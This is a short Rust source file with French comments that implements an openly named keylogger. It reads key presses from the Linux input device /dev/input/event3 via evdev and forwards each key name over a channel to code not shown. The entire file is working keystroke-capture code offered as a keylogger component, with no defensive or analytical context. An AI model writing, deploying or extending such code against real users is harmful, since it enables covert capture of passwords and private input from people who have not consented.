use evdev::{Device, InputEventKind};
use std::fs;
use std::sync::mpsc::Sender;

pub fn start_keylogger(tx: Sender<String>) {
    // Détecte automatiquement ou fixe à ton device
    let dev_path = "/dev/input/event3";
    let mut dev = Device::open(dev_path).expect("Failed to open input device");

    println!("[*] Keylogger actif sur {}", dev_path);

    loop {
        for ev in dev.fetch_events().unwrap() {
            if let InputEventKind::Key(key) = ev.kind() {
                if ev.value() == 1 {
                    let key_str = format!("{:?}\n", key);
                    println!("Touche: {}", key_str.trim());
                    tx.send(key_str).unwrap();
                }
            }
        }
    }
}
